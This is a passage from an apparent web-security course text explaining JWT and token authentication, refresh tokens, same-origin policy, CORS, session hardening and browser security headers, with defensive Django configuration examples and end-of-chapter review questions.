SESSION_EXPIRE_AT_BROWSER_CLOSE = False  # Persistent sessions
SESSION_SAVE_EVERY_REQUEST = True  # Update session on each request
```

---

### 5.3.3 Token-Based Authentication

#### Why Token-Based Authentication?

Session-based authentication works well for traditional web applications, but it has limitations:

**Scalability Challenges**

Sessions require server-side storage. In distributed systems with multiple servers, session data must be shared across all servers or sticky sessions must be used.

**Cross-Domain Limitations**

Cookies are domain-specific. Sessions don't work well for APIs serving multiple domains or mobile applications.

**Stateless APIs**

RESTful APIs should be stateless. Session-based authentication introduces state on the server.

Token-based authentication addresses these issues by storing authentication information in the token itself.

#### How Token-Based Authentication Works

1. User submits login credentials
2. Server verifies credentials
3. Server generates a token containing user information
4. Token is sent to the client
5. Client stores the token (localStorage, sessionStorage, or memory)
6. Client includes token in the Authorization header of subsequent requests
7. Server validates the token and extracts user information

#### Advantages of Token-Based Authentication

**Stateless**

The server doesn't need to store session data. All necessary information is in the token. This makes scaling horizontal (adding more servers) straightforward.

**Cross-Domain/CORS**

Tokens can be sent to any domain, making them suitable for microservices architectures and single-page applications.

**Mobile-Friendly**

Tokens work well with mobile applications that don't have cookie support.

**Decoupled**

The authentication server can be separate from the application server. This enables Single Sign-On (SSO) implementations.

---

### 5.3.4 JSON Web Tokens (JWT)

#### What is JWT?

JSON Web Token (JWT, pronounced "jot") is an open standard (RFC 7519) for securely transmitting information between parties as a JSON object. JWTs are widely used for authentication and information exchange.

JWTs are self-contained tokens that include all necessary information about the user, eliminating the need for database lookups during request validation.

#### JWT Structure

A JWT consists of three parts separated by dots (`.`):

```
header.payload.signature
```

**Example JWT:**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Header**

The header typically contains:

- `alg`: The signing algorithm (e.g., HS256, RS256)
- `typ`: The token type (JWT)

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

This JSON is Base64Url encoded to form the first part.

**Payload**

The payload contains claims, which are statements about the user and additional metadata. There are three types of claims:

_Registered Claims (Predefined)_:

- `iss` (Issuer): Who issued the token
- `sub` (Subject): Who the token is about (usually user ID)
- `aud` (Audience): Who the token is intended for
- `exp` (Expiration): When the token expires (Unix timestamp)
- `nbf` (Not Before): When the token becomes valid
- `iat` (Issued At): When the token was issued
- `jti` (JWT ID): Unique identifier for the token

_Public Claims_: Custom claims agreed upon by parties using the token.

_Private Claims_: Custom claims for specific applications.

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true,
  "iat": 1516239022,
  "exp": 1516242622
}
```

**Signature**

The signature ensures the token hasn't been tampered with. It is created by:

1. Encoding the header
2. Encoding the payload
3. Combining them with a dot
4. Signing with the algorithm specified in the header

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

If anyone modifies the header or payload, the signature verification will fail.

#### JWT Signing Algorithms

**Symmetric Algorithms (HMAC)**

HMAC algorithms (HS256, HS384, HS512) use the same secret key for signing and verification. Both the issuer and the verifier must know the secret.

- Simpler to implement
- Faster computation
- Secret must be shared between services
- Suitable when the same service issues and verifies tokens

**Asymmetric Algorithms (RSA, ECDSA)**

Asymmetric algorithms (RS256, RS384, RS512, ES256) use a private key for signing and a public key for verification.

- Only the issuer needs the private key
- Anyone can verify with the public key
- Suitable for distributed systems
- Enables third-party token verification

#### JWT Authentication Flow

1. **Login Request**: Client sends credentials to the authentication endpoint
2. **Credential Verification**: Server validates username and password
3. **Token Generation**: Server creates a JWT with user claims and signs it
4. **Token Response**: Server returns the JWT to the client
5. **Token Storage**: Client stores the token (often in localStorage or memory)
6. **Authenticated Requests**: Client includes token in Authorization header
7. **Token Validation**: Server verifies the signature and checks claims
8. **Response**: Server processes the request if the token is valid

**Authorization Header Format:**

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

#### JWT Security Considerations

**Token Expiration**

Always set an expiration time (`exp` claim). Short-lived tokens are more secure but require refresh mechanisms. Common approach:

- Access tokens: Short-lived (15 minutes to 1 hour)
- Refresh tokens: Longer-lived (days to weeks)

**Token Storage**

Where to store tokens on the client:

| Storage         | XSS Vulnerable | CSRF Vulnerable | Notes                                |
| --------------- | -------------- | --------------- | ------------------------------------ |
| localStorage    | Yes            | No              | Persistent, accessible to JavaScript |
| sessionStorage  | Yes            | No              | Cleared when tab closes              |
| Memory          | Yes            | No              | Most secure, cleared on refresh      |
| HttpOnly Cookie | No             | Yes             | Requires CSRF protection             |

**Never store sensitive information in JWT**

JWT payloads are Base64 encoded, not encrypted. Anyone can decode and read the payload. Never include:

- Passwords
- Credit card numbers
- Sensitive personal information

**Token Revocation**

JWTs are self-contained, making revocation challenging. Strategies include:

- Short expiration times
- Token blacklists (requires storage)
- Refresh token rotation

**Algorithm Confusion Attacks**

Always specify and validate the expected algorithm. Never trust the algorithm specified in the token header without verification. Reject "none" algorithm.

#### JWT in Django (Using djangorestframework-simplejwt)

```python
# settings.py
INSTALLED_APPS = [
    # ...
    'rest_framework',
    'rest_framework_simplejwt',
]

REST_FRAMEWORK = {
    'DEFAULT_AUTHENTICATION_CLASSES': (
        'rest_framework_simplejwt.authentication.JWTAuthentication',
    ),
}

from datetime import timedelta

SIMPLE_JWT = {
    'ACCESS_TOKEN_LIFETIME': timedelta(minutes=30),
    'REFRESH_TOKEN_LIFETIME': timedelta(days=7),
    'ROTATE_REFRESH_TOKENS': True,  # New refresh token on each use
    'ALGORITHM': 'HS256',
}
```

```python
# urls.py
from rest_framework_simplejwt.views import (
    TokenObtainPairView,
    TokenRefreshView,
)

urlpatterns = [
    path('api/token/', TokenObtainPairView.as_view(), name='token_obtain_pair'),
    path('api/token/refresh/', TokenRefreshView.as_view(), name='token_refresh'),
]
```

---

### 5.3.5 Refresh Tokens

#### The Problem with Access Tokens

If access tokens have long expiration times:

- Stolen tokens remain valid for a long period
- Increased security risk

If access tokens have short expiration times:

- Users must log in frequently
- Poor user experience

Refresh tokens solve this dilemma.

#### How Refresh Tokens Work

- **Access Token**: Short-lived (minutes), used for API requests
- **Refresh Token**: Long-lived (days/weeks), used only to get new access tokens

**Flow:**

1. User logs in and receives both access and refresh tokens
2. User makes API requests with the access token
3. Access token expires
4. Client uses refresh token to get a new access token
5. If refresh token is expired, user must log in again

#### Refresh Token Security

Refresh tokens are high-value targets. Security measures:

- Store refresh tokens securely (HttpOnly cookies if possible)
- Implement refresh token rotation (new refresh token on each use)
- Maintain a list of valid refresh tokens
- Detect and prevent refresh token reuse (potential theft indicator)
- Allow users to revoke all refresh tokens (logout from all devices)

---

## 5.4 Security in Full-Stack Apps

Modern full-stack applications often involve frontend and backend running on different origins. This architecture introduces security considerations around cross-origin communication and session management.

---

### 5.4.1 Same-Origin Policy (SOP)

#### What is Same-Origin Policy?

The Same-Origin Policy is a fundamental browser security mechanism that restricts how documents or scripts from one origin can interact with resources from another origin.

Two URLs have the same origin if they share the same:

- **Protocol** (http vs https)
- **Host** (domain name)
- **Port** (80, 443, 3000, etc.)

**Examples:**

| URL A                | URL B                   | Same Origin? | Reason                    |
| -------------------- | ----------------------- | ------------ | ------------------------- |
| http://example.com/a | http://example.com/b    | Yes          | Same protocol, host, port |
| http://example.com   | https://example.com     | No           | Different protocol        |
| http://example.com   | http://api.example.com  | No           | Different host            |
| http://example.com   | http://example.com:8080 | No           | Different port            |

#### Why SOP Exists

SOP prevents malicious websites from accessing sensitive data on other websites. Without SOP:

- A malicious site could read your email from Gmail
- Scripts could access your banking session
- Private data could be stolen from any site you're logged into

#### SOP Restrictions

SOP restricts:

- AJAX/Fetch requests to different origins
- Reading cookies from different origins
- Accessing DOM of different-origin iframes
- Reading responses from different-origin images in canvas

SOP allows:

- Loading images from different origins
- Loading scripts from different origins (CDNs)
- Loading CSS from different origins
- Embedding iframes (but not accessing their content)
- Form submissions to different origins

---

### 5.4.2 Cross-Origin Resource Sharing (CORS)

#### What is CORS?

Cross-Origin Resource Sharing (CORS) is a mechanism that allows servers to specify who can access their resources from different origins. It is a controlled relaxation of the Same-Origin Policy.

CORS uses HTTP headers to tell browsers which cross-origin requests are permitted.

#### Why CORS is Necessary

Modern applications often need cross-origin communication:

- Frontend on `https://app.example.com` needs to call API on `https://api.example.com`
- Single-page applications calling backend APIs
- Microservices architectures
- Third-party API integrations

CORS provides a secure way to enable these interactions.

#### How CORS Works

**Simple Requests**

Some requests are considered "simple" and don't trigger a preflight check:

- Methods: GET, HEAD, POST
- Headers: Only certain headers (Accept, Accept-Language, Content-Language, Content-Type with specific values)
- Content-Type: application/x-www-form-urlencoded, multipart/form-data, or text/plain

For simple requests:

1. Browser adds `Origin` header to the request
2. Server includes CORS headers in the response
3. Browser checks if the response allows the origin
4. If allowed, JavaScript can access the response

**Preflight Requests**

For requests that don't meet "simple" criteria, browsers send a preflight request:

1. Browser sends OPTIONS request asking what is allowed
2. Server responds with allowed methods, headers, and origins
3. If the actual request is permitted, browser proceeds
4. If not permitted, browser blocks the request

**Preflight requests are triggered by:**

- Methods other than GET, HEAD, POST
- Custom headers
- Content-Type other than the simple types
- Requests with credentials to different origins

#### CORS Headers

**Response Headers (Server → Browser)**

| Header                             | Description                                                 |
| ---------------------------------- | ----------------------------------------------------------- |
| `Access-Control-Allow-Origin`      | Specifies which origins are allowed (\* or specific origin) |
| `Access-Control-Allow-Methods`     | Allowed HTTP methods for the request                        |
| `Access-Control-Allow-Headers`     | Allowed headers in the actual request                       |
| `Access-Control-Allow-Credentials` | Whether cookies/auth can be included                        |
| `Access-Control-Expose-Headers`    | Headers that JavaScript can access                          |
| `Access-Control-Max-Age`           | How long preflight results can be cached                    |

**Request Headers (Browser → Server)**

| Header                           | Description                                |
| -------------------------------- | ------------------------------------------ |
| `Origin`                         | The origin making the request              |
| `Access-Control-Request-Method`  | Method for the actual request (preflight)  |
| `Access-Control-Request-Headers` | Headers for the actual request (preflight) |

#### CORS and Credentials

When requests include credentials (cookies, HTTP authentication):

- `Access-Control-Allow-Origin` cannot be `*`; it must be a specific origin
- `Access-Control-Allow-Credentials` must be `true`
- Client must set `credentials: 'include'` (fetch) or `withCredentials: true` (XHR)

#### CORS Configuration in Django

```python
# settings.py

# Install: pip install django-cors-headers

INSTALLED_APPS = [
    # ...
    'corsheaders',
]

MIDDLEWARE = [
    'corsheaders.middleware.CorsMiddleware',  # Should be placed before CommonMiddleware
    'django.middleware.common.CommonMiddleware',
    # ...
]

# Option 1: Allow specific origins
CORS_ALLOWED_ORIGINS = [
    'https://app.example.com',
    'https://admin.example.com',
]

# Option 2: Allow all origins (NOT recommended for production)
# CORS_ALLOW_ALL_ORIGINS = True

# Allow credentials (cookies)
CORS_ALLOW_CREDENTIALS = True

# Allowed methods
CORS_ALLOW_METHODS = [
    'GET',
    'POST',
    'PUT',
    'PATCH',
    'DELETE',
    'OPTIONS',
]

# Allowed headers
CORS_ALLOW_HEADERS = [
    'authorization',
    'content-type',
    'x-requested-with',
]
```

#### CORS Security Best Practices

1. **Never use wildcard (\*) with credentials**: This is not even allowed by browsers.
2. **Whitelist specific origins**: Don't allow all origins in production.
3. **Validate the Origin header**: If dynamically setting CORS headers, validate against a whitelist.
4. **Limit exposed headers**: Only expose headers that the frontend needs.
5. **Set appropriate Max-Age**: Balance between reducing preflight requests and security updates.
6. **Don't rely solely on CORS**: CORS is a browser mechanism; it doesn't protect against non-browser clients.

#### CORS Misconceptions

**CORS is not server-side protection**

CORS is enforced by browsers. Non-browser clients (curl, Postman, server-to-server) can make any request regardless of CORS.

**CORS doesn't prevent requests**

The request is still made to the server. CORS only prevents browsers from reading the response. Server-side effects (like database changes) still occur.

**CORS is not authentication**

CORS determines which origins can read responses, not who is authenticated. Authentication must be handled separately.

---

### 5.4.3 Session Hardening

Session security goes beyond setting cookie flags. Session hardening involves multiple layers of protection.

#### Session ID Security

**Cryptographically Random Session IDs**

Session IDs must be generated using cryptographically secure random number generators. Predictable session IDs can be guessed by attackers.

Django uses `secrets` module for session ID generation, which provides cryptographically secure random values.

**Session ID Length**

Session IDs should be long enough to prevent brute-force guessing. A minimum of 128 bits of entropy is recommended. Django's default session ID is sufficiently long.

**Don't Expose Session ID in URLs**

Session IDs should never appear in URLs because:

- URLs are logged in server logs
- URLs appear in browser history
- URLs can be leaked through Referer headers
- URLs can be shared accidentally

#### Session Lifecycle Management

**Regenerate Session ID After Authentication**

After a user logs in, regenerate the session ID to prevent session fixation attacks. The attacker may have set a session ID before login, but regeneration invalidates it.

```python
# views.py
from django.contrib.auth import login
from django.contrib.auth.forms import AuthenticationForm

def login_view(request):
    if request.method == 'POST':
        form = AuthenticationForm(request, data=request.POST)
        if form.is_valid():
            user = form.get_user()
            login(request, user)  # Django regenerates session ID automatically
            return redirect('home')
    return render(request, 'login.html', {'form': form})
```

Django's `login()` function automatically regenerates the session ID.

**Session Timeout**

Implement both idle timeout and absolute timeout:

- **Idle Timeout**: Session expires after a period of inactivity
- **Absolute Timeout**: Session expires after a maximum duration, regardless of activity

```python
# settings.py

# Idle timeout: Update session expiry on each request
SESSION_SAVE_EVERY_REQUEST = True

# Session age (can serve as absolute timeout if not updating)
SESSION_COOKIE_AGE = 86400  # 24 hours

# Expire session when browser closes
SESSION_EXPIRE_AT_BROWSER_CLOSE = True  # Optional
```

**Invalidate Session on Logout**

When users log out, completely invalidate the session on the server. Don't just clear the client cookie.

```python
# views.py
from django.contrib.auth import logout

def logout_view(request):
    logout(request)  # Clears session data and regenerates session key
    return redirect('home')
```

**Logout from All Devices**

Provide users with the ability to invalidate all active sessions, especially after password changes or suspected account compromise.

#### Session Binding

**IP Address Binding**

Bind sessions to the client's IP address. If the IP changes, invalidate the session or require re-authentication.

Considerations:

- Users behind proxies may share IPs
- Mobile users may change IPs frequently
- Use as an additional factor, not the sole protection

**User Agent Binding**

Track the browser's User-Agent string. Changes may indicate session theft.

Considerations:

- User agents can be spoofed
- Browser updates may change the User-Agent
- Use in combination with other measures

---

### 5.4.4 Browser Security Headers

Modern browsers support several security headers that help protect against common attacks. Properly configured headers add an extra layer of defense.

#### Content-Security-Policy (CSP)

Content Security Policy controls which resources the browser can load and execute. It is one of the most powerful defenses against XSS.

**How CSP Works:**

The server sends a header specifying allowed sources for various resource types. The browser enforces these restrictions.

**Common CSP Directives:**

| Directive     | Purpose                                 |
| ------------- | --------------------------------------- |
| `default-src` | Default fallback for all resource types |
| `script-src`  | Allowed sources for JavaScript          |
| `style-src`   | Allowed sources for CSS                 |
| `img-src`     | Allowed sources for images              |
| `connect-src` | Allowed sources for AJAX/WebSocket      |
| `font-src`    | Allowed sources for fonts               |
| `frame-src`   | Allowed sources for iframes             |
| `form-action` | Allowed targets for form submissions    |

**Example CSP Header:**

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:
```

This policy:

- Allows resources only from the same origin by default
- Allows scripts from same origin and cdn.example.com
- Allows styles from same origin and inline styles
- Allows images from same origin, data URIs, and any HTTPS source

**CSP in Django:**

```python
# settings.py (using django-csp package)

# Install: pip install django-csp

CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'", 'https://cdn.example.com')
CSP_STYLE_SRC = ("'self'", "'unsafe-inline'")
CSP_IMG_SRC = ("'self'", 'data:', 'https:')
```

#### X-Frame-Options

This header prevents your page from being embedded in iframes on other sites, protecting against clickjacking attacks.

**Values:**

- `DENY`: Page cannot be displayed in any frame
- `SAMEORIGIN`: Page can only be framed by same-origin pages
- `ALLOW-FROM uri`: Deprecated; use CSP frame-ancestors instead

```python
# settings.py
X_FRAME_OPTIONS = 'DENY'  # Django default is DENY
```

#### X-Content-Type-Options

This header prevents browsers from MIME-type sniffing, which can lead to security vulnerabilities.

```python
# settings.py
SECURE_CONTENT_TYPE_NOSNIFF = True
```

This adds the header: `X-Content-Type-Options: nosniff`

#### X-XSS-Protection

This legacy header enabled the browser's built-in XSS filter. Modern browsers are deprecating this in favor of CSP.

```
X-XSS-Protection: 1; mode=block
```

However, CSP is now the recommended approach for XSS protection.

#### Referrer-Policy

Controls how much referrer information is included with requests.

**Values:**

| Value                             | Behavior                                                             |
| --------------------------------- | -------------------------------------------------------------------- |
| `no-referrer`                     | No referrer information sent                                         |
| `same-origin`                     | Referrer sent only for same-origin requests                          |
| `strict-origin`                   | Only origin (no path) for cross-origin                               |
| `strict-origin-when-cross-origin` | Full URL for same-origin, origin only for cross-origin (recommended) |

```python
# settings.py
SECURE_REFERRER_POLICY = 'strict-origin-when-cross-origin'
```

#### Permissions-Policy (formerly Feature-Policy)

Controls which browser features can be used on the page.

```
Permissions-Policy: geolocation=(), camera=(), microphone=()
```

This disables geolocation, camera, and microphone access for the page.

#### Complete Security Headers Example in Django

```python
# settings.py

# HTTPS settings
SECURE_SSL_REDIRECT = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True

# Cookie settings
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Lax'
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_HTTPONLY = True
CSRF_COOKIE_SAMESITE = 'Lax'

# Security headers
SECURE_CONTENT_TYPE_NOSNIFF = True
X_FRAME_OPTIONS = 'DENY'
SECURE_REFERRER_POLICY = 'strict-origin-when-cross-origin'

# Add middleware for additional headers if needed
```

---

## Questions

1. Define Cross-Site Scripting (XSS). Differentiate between Stored XSS and Reflected XSS. Explain four potential impacts of XSS attacks on web applications. [2+2+4]

2. What is SQL Injection? Explain how SQL Injection attacks work with an example. Describe four preventive measures against SQL Injection in web applications. [2+2+4]

3. Define Cross-Site Request Forgery (CSRF). Explain how CSRF attacks exploit user sessions. Describe how Django's CSRF protection mechanism works with a code example. [2+3+3]

4. What is input validation? Differentiate between whitelist (allowlist) and blacklist (denylist) validation approaches. Explain why server-side validation is mandatory even when client-side validation is implemented. [2+3+3]

5. Define input sanitization. Explain the difference between input validation and input sanitization. Describe HTML encoding and its role in preventing XSS attacks. [2+3+3]

6. What is HTTPS? Explain the three key security properties provided by HTTPS (encryption, data integrity, and authentication). Describe how to configure Django to enforce HTTPS. [2+4+2]

7. Explain the purpose of the following cookie security attributes: Secure, HttpOnly, and SameSite. Write the Django settings to configure secure session cookies. [6+2]

8. What are environment variables? Explain why sensitive information like database passwords and API keys should be stored in environment variables instead of source code. Demonstrate how to use environment variables in Django settings. [2+4+2]

9. Differentiate between authentication and authorization. Explain why storing passwords in plain text is dangerous. Describe the concept of password hashing and its key properties. [2+2+4]

10. What is password salting? Explain why simple hash functions like MD5 are not suitable for password hashing. Compare any two modern password hashing algorithms (bcrypt, Argon2, PBKDF2, or scrypt). [2+3+3]

11. Explain session-based authentication and its working mechanism. Describe three session security concerns (session hijacking, session fixation, and session prediction) and their prevention methods. [4+4]

12. What is token-based authentication? Explain four advantages of token-based authentication over session-based authentication. Describe the token-based authentication flow. [2+4+2]

13. Define JSON Web Token (JWT). Explain the three components of a JWT (header, payload, and signature). Describe why the signature is important for JWT security. [2+4+2]

14. Differentiate between symmetric (HMAC) and asymmetric (RSA) JWT signing algorithms. Explain four security considerations when implementing JWT authentication. [4+4]

15. What are refresh tokens? Explain the problem that refresh tokens solve in token-based authentication. Describe four security measures for handling refresh tokens. [2+2+4]

16. Define Same-Origin Policy (SOP). Explain what constitutes "same origin" with examples. Describe what SOP restricts and what it allows in web browsers. [2+3+3]

17. What is Cross-Origin Resource Sharing (CORS)? Differentiate between simple requests and preflight requests. Explain four CORS response headers and their purposes. [2+2+4]

18. Explain session hardening techniques including: session ID regeneration after login, session timeout implementation, and session binding. Write Django configuration for implementing session timeouts. [6+2]

19. What is Content Security Policy (CSP)? Explain four CSP directives and their purposes. Describe how CSP helps prevent XSS attacks. [2+4+2]

20. Define the OWASP Top 10. List and briefly explain any four vulnerabilities from the OWASP Top 10 (2021 edition). Explain why developers should be aware of the OWASP Top 10. [2+4+2]

21. What is Multi-Factor Authentication (MFA)? Explain the three categories of authentication factors with examples. Describe how Time-Based One-Time Passwords (TOTP) work. [2+3+3]

22. Explain the following browser security headers: X-Frame-Options, X-Content-Type-Options, Referrer-Policy, and Permissions-Policy. Write Django settings to implement these security headers. [6+2]
